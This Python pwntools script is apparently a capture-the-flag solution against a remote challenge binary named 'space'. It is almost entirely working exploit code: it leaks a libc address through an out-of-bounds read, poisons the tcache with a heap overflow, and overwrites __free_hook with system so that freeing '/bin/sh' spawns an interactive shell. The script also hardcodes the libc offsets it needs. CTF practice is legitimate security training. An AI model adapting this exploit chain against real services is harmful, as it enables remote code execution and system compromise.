from pwn import *
# 1 use out of bound read to leak libc from stack
# 2 use heap overflow to control next chunk's fd to perform tcache poisoning
# 3 overwrite __free_hook with system then free chunk with "/bin/sh" as data => shell \o/

#p = process("./space")
p = remote("jh2i.com","50016")
p.recv(8000)
p.sendline("3")
p.recv(8000)
p.sendline("38")
p.recvuntil(" name: ")
data = p.recvline().strip()
leak = u64(data.ljust(8,"\x00"))
print "leak: ",hex(leak)
base = leak - 0x19a350
print "libc_base: ",hex(base)
free_hook = base + 0x00000000003ed8e8
system = base + 0x000000000004f4e0
p.sendline("n")
p.sendline("1")
p.sendline("a")
p.sendline("b")
p.sendline("n")
p.sendline("n")
p.sendline("n")

p.sendline("1")
p.sendline("a")
p.sendline("b")
p.sendline("n")
p.sendline("n")
p.sendline("n")

p.sendline("1")
p.sendline("a")
p.sendline("b")
p.sendline("n")
p.sendline("n")
p.sendline("n")

p.sendline("1")
p.sendline("a")
p.sendline("b")
p.sendline("n")
p.sendline("n")
p.sendline("n")

p.sendline("4")
p.sendline("n")
p.sendline("4")
p.sendline("n")

p.sendline("1")
p.sendline("a")
p.sendline("b")
p.sendline("y")
p.sendline("5")
p.sendline("A"*(32-16) + p64(0x70) + p64(free_hook-0x10))
p.sendline("6")
p.sendline("n")
p.recv(8000)
p.recv(8000)

p.sendline("1")
p.sendline("a")
p.sendline("b")
p.sendline("n")
p.sendline("n")
p.sendline("n")

p.sendline("1")
p.sendline(p64(system))
p.sendline("")
p.sendline("n")
p.sendline("y")
p.sendline("9")
p.sendline("/bin/sh")
p.sendline("n")
p.sendline("4")

p.interactive()
